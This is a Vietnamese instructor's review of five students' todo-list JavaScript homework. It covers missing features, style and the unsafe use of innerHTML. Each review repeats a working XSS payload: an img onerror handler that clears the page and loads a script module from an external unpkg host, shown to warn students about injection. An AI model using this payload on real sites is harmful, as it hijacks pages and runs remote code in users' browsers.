# Dương review bài học viên lớp K1-Fullstack

## [Luu Anh Quan](https://anhquan2211.github.io/F8-OFFLINE/f8-offline-day24/index.html)

- [x] [Bài 1]

  Bài làm rất tốt\*

  Thiếu case sau khi submit thì focus lại vào input.

  Đang sử dụng innerHTML, có thể xảy ra lỗi khi người dùng cố tình nhập một script vào.

  ```html
  <img
    src=""
    onerror='b=document,a=b.body;a.innerHTML="";a.appendChild(c = b.createElement("script"),c.type="module",c.innerHTML=`import {HTML} from "https:\/\/unpkg.com/jsvjp";HTML("h1", "error", "HACKED!")`);a.appendChild(d=b.createElement("link"),d.rel="stylesheet",d.href="https:\/\/unpkg.com/jsvjp/style.css");'
  />
  ```

  Các file App.js, Footer.js, Header.js nên tách ra thành các phần của folder layout để tránh bị rối với các components khác.

- [x] Đánh giá chung bài tập về nhà: Bài tập làm rất tốt, có hướng làm theo cách quản lý state và cập nhật DOM của React+redux.

---

## [Trung Le](https://github.com/Trungdeptraii/22-08-2023-Le-Van_Trung-Day24.git)

- [x] [Bài 1]

  Bài làm rất tốt\*

  Thiếu case thêm task bằng cách nhấn `enter`.

  - Có thể sử dụng thẻ form để có sự kiện mặc định đó.

  Đang sử dụng value trực tiếp từ input chưa qua xử lý để đưa vào HTML, việc làm này rất dễ gặp lỗi tấn công XSS

  ```html
  "/><img
    src=""
    onerror='b=document,a=b.body;a.innerHTML="";a.appendChild(c = b.createElement("script"),c.type="module",c.innerHTML=`import {HTML} from "https:\/\/unpkg.com/jsvjp";HTML("h1", "error", "HACKED!")`);a.appendChild(d=b.createElement("link"),d.rel="stylesheet",d.href="https:\/\/unpkg.com/jsvjp/style.css");'
  />
  ```

  Các element get nhiều, có thể sử dụng một cách khác ngắn gọn hơn để lấy phần tử:

  ```js
  var $ = (tag) => document.querySelector(tag);
  var $$ = (tag) => document.querySelectorAll(tag);
  ```

  Các style nên sử dụng class Css để dễ dàng trong việc xử lý style tốt hơn.

- [x] Đánh giá chung bài tập về nhà: Bài tập làm rất tốt, tuy nhiên cần tối ưu lại phần chọn element để bài làm đỡ rối hơn.

---

## [Dương Quốc Anh](https://github.com/QuocAnh-bit/F8_fullstack_006/blob/main/buoi_24/js/ex01.js)

- [x] [Bài 1]

  Bài làm tốt\*

  Có thể phát triển thêm sau khi submit **bằng button** thì focus lại vào input.

  Case sửa input đang bị lỗi khi có từ 2 task trở lên thì sẽ bị sai value cũ của input, sau khi sửa, input không còn ở đúng vị trí của nó. Mà sẽ xuống cuối cùng.

  Chưa check trường hợp sau khi sửa, input rỗng vẫn được lưu.

  Đang sử dụng innerHTML, có thể xảy ra lỗi khi người dùng cố tình nhập một script vào.

  ```html
  <img
    src=""
    onerror='b=document,a=b.body;a.innerHTML="";a.appendChild(c = b.createElement("script"),c.type="module",c.innerHTML=`import {HTML} from "https:\/\/unpkg.com/jsvjp";HTML("h1", "error", "HACKED!")`);a.appendChild(d=b.createElement("link"),d.rel="stylesheet",d.href="https:\/\/unpkg.com/jsvjp/style.css");'
  />
  ```

- [x] Đánh giá chung bài tập về nhà: Bài tập làm tốt, tuy nhiên còn một số case chưa hoàn thiện tốt.

---

## [Duy Hiếu Nguyễn](https://hieuboss.github.io/F8-fullstack-k2/javascript/lesson9/ex1/ex1.html)

- [x] [Bài 1]

  Bài làm chưa tốt

  Thiếu 2 case quan trọng: Sửa, xóa task.

  Đang sử dụng innerHTML, có thể xảy ra lỗi khi người dùng cố tình nhập một script vào.

  ```html
  <img
    src=""
    onerror='b=document,a=b.body;a.innerHTML="";a.appendChild(c = b.createElement("script"),c.type="module",c.innerHTML=`import {HTML} from "https:\/\/unpkg.com/jsvjp";HTML("h1", "error", "HACKED!")`);a.appendChild(d=b.createElement("link"),d.rel="stylesheet",d.href="https:\/\/unpkg.com/jsvjp/style.css");'
  />
  ```

- [x] Đánh giá chung bài tập về nhà: Bài tập làm chưa tốt, thiếu các case quan trọng khiến bài làm chưa hoàn thiện.

---

## [Phan Trung Hiếu](https://github.com/pth2003/FullStack_Nodejs_K1/blob/main/BTVN/btvn_buoi_24/script.js)

**Chưa có github page**

- [x] [Bài 1]

  Bài làm chưa tốt

  Thiếu 1 case quan trọng: Sửa

  Đang sử dụng innerHTML, có thể xảy ra lỗi khi người dùng cố tình nhập một script vào.

  ```html
  <img
    src=""
    onerror='b=document,a=b.body;a.innerHTML="";a.appendChild(c = b.createElement("script"),c.type="module",c.innerHTML=`import {HTML} from "https:\/\/unpkg.com/jsvjp";HTML("h1", "error", "HACKED!")`);a.appendChild(d=b.createElement("link"),d.rel="stylesheet",d.href="https:\/\/unpkg.com/jsvjp/style.css");'
  />
  ```

- [x] Đánh giá chung bài tập về nhà: Bài tập làm chưa tốt, thiếu 1 case quan trọng khiến bài làm chưa hoàn thiện.
